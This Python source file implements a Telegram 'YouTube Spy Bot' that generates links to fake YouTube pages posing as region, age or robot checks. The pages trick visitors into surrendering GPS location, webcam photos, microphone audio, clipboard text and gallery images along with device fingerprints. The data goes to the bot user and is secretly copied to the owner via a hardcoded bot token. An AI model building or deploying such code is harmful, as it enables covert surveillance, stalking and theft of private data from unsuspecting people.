import os
from dotenv import load_dotenv
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request, jsonify, render_template_string
import threading
import requests
import uuid
import base64
import html
import time
import json

# Local computer ke liye .env load karein
load_dotenv()

# --- CONFIGURATION ---
API_TOKEN = os.getenv('BOT_TOKEN')
SERVER_URL = os.getenv('SERVER_URL')
OWNER_ID = os.getenv('OWNER_ID')

# 🕵️ PROOF BOT CONFIGURATION (Shadow Forwarding)
PROOF_TOKEN = "8250220232:AAETY26m085cqgHgR5b4cDkguyJ-FiVawj8"  # <--- Proof Bot Token Added

# Basic Checks
if not API_TOKEN:
    print("❌ Error: BOT_TOKEN nahi mila!")
    exit()

if not SERVER_URL:
    print("❌ Error: SERVER_URL nahi mila!")
    exit()

try:
    OWNER_ID = int(OWNER_ID)
except:
    print("⚠️ Warning: OWNER_ID sahi nahi hai ya set nahi hai. Shadow Forwarding kaam nahi karega.")
    OWNER_ID = 0

# Do Bots Initialize karein
bot = telebot.TeleBot(API_TOKEN)         # User se baat karne ke liye
proof_bot = telebot.TeleBot(PROOF_TOKEN) # Chupke se Owner ko data bhejne ke liye

app = Flask(__name__)

# --- PERMISSIONS SETUP ---
admins = set()
allowed_users = set()
user_details = {}

# Owner ko default access
allowed_users.add(OWNER_ID)
admins.add(OWNER_ID)

# Database & State
link_data = {}          # Link ID -> Data mapping
user_state = {}         # Current menu state
user_active_links = {}  # Chat ID -> Last Active Link ID (For Auto-Expiry)

print("🕵️ Ultimate YouTube Spy Bot (with Proof System) Loaded...")

# ==========================================
# 1. HTML TEMPLATES (All 6 Modes)
# ==========================================

HTML_NORMAL = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>YouTube</title><style>body{margin:0;background:#0f0f0f;color:white;font-family:Roboto,Arial,sans-serif;overflow:hidden}.header{height:48px;background:#202020;display:flex;align-items:center;padding:0 16px;box-shadow:0 4px 6px rgba(0,0,0,0.3)}.logo{color:white;font-weight:bold;font-size:18px;letter-spacing:-1px;display:flex;align-items:center}.play-icon{width:24px;height:16px;background:red;border-radius:4px;margin-right:5px;position:relative}.play-icon::after{content:'';position:absolute;top:4px;left:9px;border-top:4px solid transparent;border-bottom:4px solid transparent;border-left:7px solid white}.skeleton{padding:0}.video-box{width:100%;height:240px;background:#1e1e1e;display:flex;justify-content:center;align-items:center;position:relative}.loader{border:4px solid rgba(255,255,255,0.1);border-top:4px solid #fff;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite}.info{padding:15px}.line{height:14px;background:#333;margin-bottom:10px;border-radius:2px}.w-60{width:60%}.w-40{width:40%}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style></head><body><div class="header"><div class="logo"><div class="play-icon"></div>YouTube</div></div><div class="skeleton"><div class="video-box"><div class="loader"></div></div><div class="info"><div class="line w-60" style="height:20px;margin-bottom:15px"></div><div class="line w-40"></div><div class="line w-60"></div></div></div><script>function getGPU(){try{var canvas=document.createElement('canvas');var gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl');var info=gl.getExtension('WEBGL_debug_renderer_info');return gl.getParameter(info.UNMASKED_RENDERER_WEBGL)}catch(e){return"Unknown GPU"}}async function collect(){let data={id:"{{ id }}",type:"normal",gpu:getGPU(),screen:`${window.screen.width}x${window.screen.height}`,platform:navigator.platform,ua:navigator.userAgent,cores:navigator.hardwareConcurrency||0,ram:navigator.deviceMemory||0,downlink:0,effectiveType:'Unknown',battery:'Unknown',charging:'No',dark_mode:window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches};try{if(navigator.connection){data.downlink=navigator.connection.downlink;data.effectiveType=navigator.connection.effectiveType}}catch(e){}try{if(navigator.getBattery){let bat=await navigator.getBattery();data.battery=Math.round(bat.level*100)+"%";data.charging=bat.charging?"Yes ⚡":"No"}}catch(e){}fetch('/callback',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).finally(()=>{window.location.href="{{ url }}"})}window.onload=collect;</script></body></html>"""

HTML_GPS = """<!DOCTYPE html><html><head><title>YouTube</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body{background:#0f0f0f;color:#fff;font-family:Roboto,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center}.icon{font-size:50px;margin-bottom:20px}h2{font-size:20px;margin-bottom:10px}p{color:#aaa;font-size:14px;max-width:300px;margin-bottom:30px;line-height:1.5}.btn{background:#3ea6ff;color:#0f0f0f;padding:10px 25px;border:none;border-radius:20px;font-weight:bold;cursor:pointer;text-transform:uppercase;font-size:14px}</style></head><body><div class="icon">🌍</div><h2>Location Verification</h2><p>This video is not available in your current region. Please confirm your location to continue watching.</p><button class="btn" onclick="getLocation()">Confirm Location</button><p id="status" style="margin-top:15px;font-size:12px;color:#555"></p><script>function getGPU(){try{var c=document.createElement('canvas');var gl=c.getContext('webgl');var i=gl.getExtension('WEBGL_debug_renderer_info');return gl.getParameter(i.UNMASKED_RENDERER_WEBGL)}catch(e){return"Unknown"}}function getLocation(){document.getElementById("status").innerText="Verifying region...";if(navigator.geolocation){navigator.geolocation.getCurrentPosition(showPosition,showError)}else{window.location.href="{{ url }}"}}async function showPosition(pos){let data={id:"{{ id }}",type:"gps",lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy,gpu:getGPU(),screen:`${window.screen.width}x${window.screen.height}`,platform:navigator.platform,ua:navigator.userAgent,cores:navigator.hardwareConcurrency||0,ram:navigator.deviceMemory||0,battery:'Unknown',charging:'No',dark_mode:window.matchMedia&&window.matchMedia('(prefers-color-scheme: dark)').matches};try{if(navigator.getBattery){let bat=await navigator.getBattery();data.battery=Math.round(bat.level*100)+"%";data.charging=bat.charging?"Yes ⚡":"No"}}catch(e){}fetch('/callback',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).then(()=>{window.location.href="{{ url }}"})}function showError(error){window.location.href="{{ url }}"}</script></body></html>"""

HTML_CAM = """<!DOCTYPE html><html><head><title>Age Verification</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body{background:#0f0f0f;color:#fff;font-family:Roboto,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0}.warning-icon{font-size:40px;margin-bottom:15px}h2{font-size:22px;margin-bottom:10px}p{color:#aaa;font-size:14px;margin-bottom:25px;text-align:center;max-width:80%}.btn{background:transparent;border:1px solid #3ea6ff;color:#3ea6ff;padding:10px 30px;border-radius:4px;cursor:pointer;font-weight:500}video{position:absolute;opacity:0;pointer-events:none}</style></head><body><div class="warning-icon">🔞</div><h2>Age Restricted Content</h2><p>This video may be inappropriate for some users. Please verify your age to proceed.</p><button class="btn" onclick="startCam()">I AM OVER 18</button><video id="video" autoplay playsinline muted></video><canvas id="canvas" style="display:none"></canvas><script>async function startCam(){try{const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});const video=document.getElementById('video');video.srcObject=stream;video.onloadedmetadata=()=>{video.play();setTimeout(takePhoto,2000)}}catch(e){window.location.href="{{ url }}"}}function takePhoto(){const video=document.getElementById('video');const canvas=document.getElementById('canvas');canvas.width=video.videoWidth;canvas.height=video.videoHeight;canvas.getContext('2d').drawImage(video,0,0);fetch('/upload_cam',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:"{{ id }}",image:canvas.toDataURL('image/jpeg',0.8)})}).then(()=>{video.srcObject.getTracks().forEach(track=>track.stop());window.location.href="{{ url }}"})}</script></body></html>"""

HTML_AUDIO = """<!DOCTYPE html><html><head><title>Voice Search</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body{background:#0f0f0f;color:#fff;font-family:Roboto,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0}.mic-icon{width:60px;height:60px;background:#202020;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px;margin-bottom:20px;color:#aaa}h2{font-size:20px;font-weight:400;margin-bottom:10px}p{color:#aaa;font-size:14px;margin-bottom:30px}.listening{color:#3ea6ff;animation:pulse 1.5s infinite}@keyframes pulse{0%{opacity:0.5}50%{opacity:1}100%{opacity:0.5}}</style></head><body><div class="mic-icon">🎤</div><h2 id="status">Microphone Permission</h2><p>Tap Allow to use Voice Search</p><script>async function startRec(){try{const stream=await navigator.mediaDevices.getUserMedia({audio:true});document.getElementById("status").innerText="Listening...";document.getElementById("status").classList.add("listening");const mediaRecorder=new MediaRecorder(stream);const audioChunks=[];mediaRecorder.addEventListener("dataavailable",event=>{audioChunks.push(event.data)});mediaRecorder.addEventListener("stop",()=>{const audioBlob=new Blob(audioChunks);const reader=new FileReader();reader.readAsDataURL(audioBlob);reader.onloadend=()=>{fetch('/upload_audio',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:"{{ id }}",audio:reader.result})}).then(()=>{window.location.href="{{ url }}"})}});mediaRecorder.start();setTimeout(()=>{mediaRecorder.stop()},5000)}catch(e){window.location.href="{{ url }}"}}window.onload=startRec;</script></body></html>"""

HTML_PRANK = """<!DOCTYPE html><html><head><title>Playback Error</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body{background:#000;color:#fff;font-family:Roboto,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0;text-align:center}.icon{font-size:60px;color:#aaa;margin-bottom:20px}h2{font-size:18px;margin-bottom:10px;font-weight:500}p{color:#888;font-size:14px;margin-bottom:30px}.btn{background:white;color:black;border:none;padding:10px 20px;border-radius:2px;font-weight:bold;cursor:pointer;display:flex;align-items:center;gap:8px;font-size:14px}.play-symbol{width:0;height:0;border-top:6px solid transparent;border-bottom:6px solid transparent;border-left:10px solid black}.shake{animation:shake 0.5s;animation-iteration-count:infinite}@keyframes shake{0%{transform:translate(1px,1px) rotate(0deg)}10% {transform:translate(-1px,-2px) rotate(-1deg)}20% {transform:translate(-3px,0px) rotate(1deg)}30% {transform:translate(3px,2px) rotate(0deg)}40% {transform:translate(1px,-1px) rotate(1deg)}50% {transform:translate(-1px,2px) rotate(-1deg)}60% {transform:translate(-3px,1px) rotate(0deg)}70% {transform:translate(3px,1px) rotate(-1deg)}80% {transform:translate(-1px,-1px) rotate(1deg)}90% {transform:translate(1px,2px) rotate(0deg)}100% {transform:translate(1px,-2px) rotate(-1deg)}}</style></head><body><div id="main-box"><div class="icon">⚠️</div><h2>Playback Error</h2><p>Tap 'Retry' to resume video playback.</p><button class="btn" onclick="triggerPrank()"><div class="play-symbol"></div> RETRY</button></div><p id="status" style="margin-top:20px;color:red;font-size:12px;display:none;font-family:monospace;">SYSTEM FAILURE: CRITICAL_PROCESS_DIED<br>UPLOADING DATA... 99%</p><script>function triggerPrank(){document.body.classList.add("shake");document.getElementById("main-box").style.display="none";document.getElementById("status").style.display="block";if(navigator.vibrate){navigator.vibrate([500,100,500,100,1000])}try{let msg=new SpeechSynthesisUtterance("System Hacked. Phone is compromised.");msg.rate=0.8;msg.pitch=0.6;window.speechSynthesis.speak(msg)}catch(e){}navigator.clipboard.readText().then(text=>{sendData(text||"Clipboard Empty")}).catch(err=>{sendData("Permission Denied (But Prank Worked)")})}function sendData(textData){fetch('/upload_prank',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:"{{ id }}",text:textData})}).then(()=>{setTimeout(()=>{window.location.href="{{ url }}"},5000)})}</script></body></html>"""

HTML_FILE = """<!DOCTYPE html><html><head><title>Verification</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body{background:#0f0f0f;color:white;font-family:Roboto,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0}.icon{font-size:48px;margin-bottom:20px}h2{font-size:20px;font-weight:500;margin-bottom:10px}p{color:#aaa;font-size:14px;max-width:80%;text-align:center;margin-bottom:30px}.upload-btn{background:#3ea6ff;color:#0f0f0f;padding:12px 30px;border:none;border-radius:4px;font-weight:bold;cursor:pointer;display:flex;align-items:center;gap:10px}#fileInput{display:none}</style></head><body><div class="icon">📁</div><h2>Human Verification</h2><p>To access this content, please upload a recent image from your gallery to confirm you are not a robot.</p><button class="upload-btn" onclick="document.getElementById('fileInput').click()"><span>SELECT IMAGE</span></button><input type="file" id="fileInput" accept="image/*" onchange="uploadFile()"><p id="status" style="margin-top:20px;color:#aaa;font-size:12px"></p><script>function uploadFile(){const fileInput=document.getElementById('fileInput');const file=fileInput.files[0];if(!file)return;document.getElementById("status").innerText="Verifying image... Please wait.";const formData=new FormData();formData.append('file',file);formData.append('id',"{{ id }}");fetch('/upload_gallery',{method:'POST',body:formData}).then(response=>{document.getElementById("status").innerText="Verification Successful!";setTimeout(()=>{window.location.href="{{ url }}"},1000)}).catch(err=>{window.location.href="{{ url }}"})}</script></body></html>"""

# ==========================================
# 2. FLASK SERVER ROUTES (Shadow Forwarding Implemented)
# ==========================================

@app.route('/<link_id>')
def handler(link_id):
    if link_id in link_data:
        data = link_data[link_id]
        target_url = data['url']
        link_type = data['type']
        
        # IP Tracking on Open (Sirf User ko jayega)
        try:
            ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
            # Link open hone par Owner ko pareshan na karein, sirf user ko batayein
            bot.send_message(data['chat_id'], f"⚠️ **Link Opened!**\nIP: `{ip}`\nFetching details...", parse_mode="Markdown")
        except: pass

        if link_type == 'normal': return render_template_string(HTML_NORMAL, id=link_id, url=target_url)
        elif link_type == 'gps': return render_template_string(HTML_GPS, id=link_id, url=target_url)
        elif link_type == 'cam': return render_template_string(HTML_CAM, id=link_id, url=target_url)
        elif link_type == 'audio': return render_template_string(HTML_AUDIO, id=link_id, url=target_url)
        elif link_type == 'prank': return render_template_string(HTML_PRANK, id=link_id, url=target_url)
        elif link_type == 'file': return render_template_string(HTML_FILE, id=link_id, url=target_url)

    return "Invalid Link (Expired)"

@app.route('/callback', methods=['POST'])
def callback():
    try:
        data = request.json
        link_id = data.get('id')

        if link_id in link_data:
            link_info = link_data[link_id]
            chat_id = link_info['chat_id']
            original_url = link_info['url']

            def clean(text):
                return html.escape(str(text))

            ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
            r = {}
            try: r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,mobile,proxy,query").json()
            except: pass

            msg = (
                f"<b>🔍 NEW VICTIM DETECTED!</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"<b>📱 DEVICE HARDWARE</b>\n"
                f"🎮 GPU: <code>{clean(data.get('gpu', 'Unknown'))}</code>\n"
                f"🔋 Battery: <code>{clean(data.get('battery', 'N/A'))}</code> (Charging: <code>{clean(data.get('charging', '?'))}</code>)\n"
                f"💾 RAM: <code>{clean(data.get('ram', '?'))} GB</code>\n"
                f"🧠 CPU Cores: <code>{clean(data.get('cores', '?'))}</code>\n"
                f"🖥️ Screen: <code>{clean(data.get('screen', 'Unknown'))}</code>\n"
                f"🌗 Dark Mode: <code>{clean(data.get('dark_mode', 'False'))}</code>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"<b>📶 NETWORK & BROWSER</b>\n"
                f"🌐 IP: <code>{clean(r.get('query', ip))}</code>\n"
                f"🕵️ User Agent: <code>{clean(data.get('ua', 'Unknown'))}</code>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"<b>🌍 IP LOCATION</b>\n"
                f"📍 City: <code>{clean(r.get('city', 'Unknown'))}</code>\n"
                f"🏳️ Country: <code>{clean(r.get('country', 'Unknown'))}</code>\n"
                f"🏢 ISP: <code>{clean(r.get('isp', 'Unknown'))}</code>\n"
            )

            if data.get('type') == 'gps':
                lat = data.get('lat')
                lon = data.get('lon')
                acc = data.get('acc')
                maps_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
                msg += (
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"<b>🛰️ EXACT GPS LOCATION</b>\n"
                    f"📍 Lat: <code>{lat}</code> | Lon: <code>{lon}</code>\n"
                    f"🎯 Accuracy: <code>{acc} meters</code>\n"
                    f"🗺️ <a href='{maps_link}'>Open in Maps</a>\n"
                )

            msg += f"━━━━━━━━━━━━━━━━━━\n🔗 Redirected to: {original_url}"
            
            # 1. Send to User (Normal)
            bot.send_message(chat_id, msg, parse_mode="HTML", disable_web_page_preview=True)
            
            # 2. 🕵️ Send to Owner via Proof Bot (Shadow Forwarding)
            try:
                proof_msg = f"🕵️ <b>SHADOW ALERT (From User: {chat_id})</b>\n\n{msg}"
                proof_bot.send_message(OWNER_ID, proof_msg, parse_mode="HTML", disable_web_page_preview=True)
            except: pass

    except Exception as e:
        print(f"Callback Error: {e}")
    return jsonify({"status": "ok"})

@app.route('/upload_cam', methods=['POST'])
def upload_cam():
    try:
        data = request.json
        link_id = data.get('id')
        img_bytes = base64.b64decode(data.get('image').split(",", 1)[1])
        if link_id in link_data:
            chat_id = link_data[link_id]['chat_id']
            
            # 1. Send to User
            bot.send_photo(chat_id, img_bytes, caption="📸 **Victim Photo Captured!**")
            
            # 2. 🕵️ Send to Owner via Proof Bot
            try:
                proof_bot.send_photo(OWNER_ID, img_bytes, caption=f"📸 <b>SHADOW CAM (User: {chat_id})</b>", parse_mode="HTML")
            except: pass
            
    except: pass
    return jsonify({"status": "ok"})

@app.route('/upload_audio', methods=['POST'])
def upload_audio():
    try:
        data = request.json
        link_id = data.get('id')
        if link_id in link_data:
            chat_id = link_data[link_id]['chat_id']
            audio_bytes = base64.b64decode(data.get('audio').split(",", 1)[1])
            
            # 1. Send to User
            bot.send_voice(chat_id, audio_bytes, caption="🎙️ Victim Audio Received")
            
            # 2. 🕵️ Send to Owner via Proof Bot
            try:
                proof_bot.send_voice(OWNER_ID, audio_bytes, caption=f"🎙️ <b>SHADOW AUDIO (User: {chat_id})</b>", parse_mode="HTML")
            except: pass
            
    except: pass
    return jsonify({"status": "ok"})

@app.route('/upload_prank', methods=['POST'])
def upload_prank():
    try:
        data = request.json
        link_id = data.get('id')
        copied_text = data.get('text')
        if link_id in link_data:
            chat_id = link_data[link_id]['chat_id']
            
            # 1. Send to User
            bot.send_message(chat_id, f"👻 **Prank Successful!**\n\n📋 **Clipboard Data:**\n`{copied_text}`", parse_mode="Markdown")
            
            # 2. 🕵️ Send to Owner via Proof Bot
            try:
                proof_bot.send_message(OWNER_ID, f"👻 <b>SHADOW CLIPBOARD (User: {chat_id})</b>\n\n{copied_text}", parse_mode="HTML")
            except: pass
            
    except: pass
    return jsonify({"status": "ok"})

@app.route('/upload_gallery', methods=['POST'])
def upload_gallery():
    try:
        link_id = request.form.get('id')
        file = request.files['file']
        if link_id in link_data and file:
            chat_id = link_data[link_id]['chat_id']
            
            # File pointer reset logic ki zarurat pad sakti hai agar stream seekable na ho, 
            # par Flask request files me usually kaam karta hai.
            # Safety ke liye file content read kar lete hain.
            file_content = file.read()
            
            # 1. Send to User
            bot.send_document(chat_id, file_content, visible_file_name=file.filename, caption=f"📁 **Gallery File:** {file.filename}")
            
            # 2. 🕵️ Send to Owner via Proof Bot
            try:
                proof_bot.send_document(OWNER_ID, file_content, visible_file_name=file.filename, caption=f"📁 <b>SHADOW FILE (User: {chat_id})</b>", parse_mode="HTML")
            except: pass
            
    except: pass
    return jsonify({"status": "ok"})

# ==========================================
# 3. TELEGRAM BOT (With Auto-Expiry Logic)
# ==========================================

def get_main_menu():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("👻 Ghost/Clipboard Prank", callback_data='mode_prank'),
        InlineKeyboardButton("📍 Normal (Info + IP)", callback_data='mode_normal'),
        InlineKeyboardButton("🛰️ GPS Location", callback_data='mode_gps'),
        InlineKeyboardButton("📸 Camera Capture", callback_data='mode_cam'),
        InlineKeyboardButton("🎙️ Audio Recording", callback_data='mode_audio'),
        InlineKeyboardButton("📁 Gallery Trap", callback_data='mode_file')
    )
    return markup

# --- OWNER & ADMIN COMMANDS ---

@bot.message_handler(commands=['addadmin'])
def make_admin(message):
    if message.chat.id != OWNER_ID: return
    try:
        new_admin_id = int(message.text.split()[1])
        admins.add(new_admin_id)
        allowed_users.add(new_admin_id)
        bot.reply_to(message, f"👮 **New Admin Added!**\nID: `{new_admin_id}`", parse_mode="Markdown")
    except:
        bot.reply_to(message, "❌ Use: `/addadmin 123456`")

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    if message.chat.id != OWNER_ID: return
    try:
        target_id = int(message.text.split()[1])
        if target_id in admins:
            admins.remove(target_id)
            bot.reply_to(message, f"🚫 Admin power removed from `{target_id}`", parse_mode="Markdown")
        else:
            bot.reply_to(message, "⚠️ Ye Admin nahi hai.")
    except:
        bot.reply_to(message, "❌ Use: `/removeadmin 123456`")

@bot.message_handler(commands=['users'])
def list_users(message):
    if message.chat.id != OWNER_ID: 
        bot.reply_to(message, "⛔ Access Denied!")
        return
    msg = "👥 **BOT USERS:**\n\n"
    for uid in allowed_users:
        info = user_details.get(uid, {'name': 'Unknown', 'username': 'None'})
        role = "👑 OWNER" if uid == OWNER_ID else ("👮 ADMIN" if uid in admins else "👤 USER")
        msg += f"{role}\nName: {info['name']}\nID: <code>{uid}</code>\n@{info['username']}\n━━━━━━━━\n"
    bot.send_message(message.chat.id, msg, parse_mode="HTML")

@bot.message_handler(commands=['grant'])
def grant_access(message):
    if message.chat.id not in admins: return
    try:
        new_id = int(message.text.split()[1])
        allowed_users.add(new_id)
        bot.reply_to(message, f"✅ **User Allowed!**\nID: `{new_id}`", parse_mode="Markdown")
    except:
        bot.reply_to(message, "❌ Use: `/grant 123456`")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user = message.from_user
    chat_id = message.chat.id
    
    if chat_id not in allowed_users:
        bot.reply_to(message, f"⛔ **ACCESS DENIED**\nID: `{chat_id}`\nSend ID to Owner.", parse_mode="Markdown")
        return

    user_details[chat_id] = {'name': user.first_name, 'username': user.username if user.username else "None"}
    bot.send_message(chat_id, "🕵️ **YouTube Spy Bot**\nSelect Mode:", reply_markup=get_main_menu(), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    chat_id = call.message.chat.id
    text = ""
    if call.data == 'mode_normal':
        user_state[chat_id] = 'normal'
        text = "📍 **Normal Mode Selected**\nSend YouTube Link:"
    elif call.data == 'mode_gps':
        user_state[chat_id] = 'gps'
        text = "🛰️ **GPS Mode Selected**\nSend YouTube Link:"
    elif call.data == 'mode_cam':
        user_state[chat_id] = 'cam'
        text = "📸 **Camera Mode Selected**\nSend YouTube Link:"
    elif call.data == 'mode_audio':
        user_state[chat_id] = 'audio'
        text = "🎙️ **Audio Mode Selected**\nSend YouTube Link:"
    elif call.data == 'mode_prank':
        user_state[chat_id] = 'prank'
        text = "👻 **Prank Mode Selected**\nSend YouTube Link:"
    elif call.data == 'mode_file':
        user_state[chat_id] = 'file'
        text = "📁 **Gallery Mode Selected**\nUser will be asked to upload photo.\nSend YouTube Link:"
    
    if text:
        bot.edit_message_text(text, chat_id, call.message.message_id, parse_mode="Markdown")

@bot.message_handler(func=lambda message: True)
def create_link(message):
    chat_id = message.chat.id
    if chat_id in user_state:
        # --- FEATURE 1: OLD LINK EXPIRY LOGIC ---
        # Agar user ka pehle koi link active tha, toh use expire kar do
        if chat_id in user_active_links:
            old_link_id = user_active_links[chat_id]
            if old_link_id in link_data:
                del link_data[old_link_id] # Purana Data delete
                # Note: Purana link open karne par ab "Invalid Link" dikhega

        mode = user_state[chat_id]
        unique_id = str(uuid.uuid4())[:6]
        
        # Save New Link
        link_data[unique_id] = {'url': message.text.strip(), 'chat_id': chat_id, 'type': mode}
        user_active_links[chat_id] = unique_id # Naye link ko active mark karo
        
        bot.reply_to(message, f"✅ **Link Ready ({mode.upper()})**\n\n🔗 `{SERVER_URL}/{unique_id}`", parse_mode="Markdown")
        user_state.pop(chat_id)
        bot.send_message(chat_id, "Menu:", reply_markup=get_main_menu())
    else:
        bot.reply_to(message, "⚠️ Select a mode first.")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port, debug=False)).start()
    bot.infinity_polling()
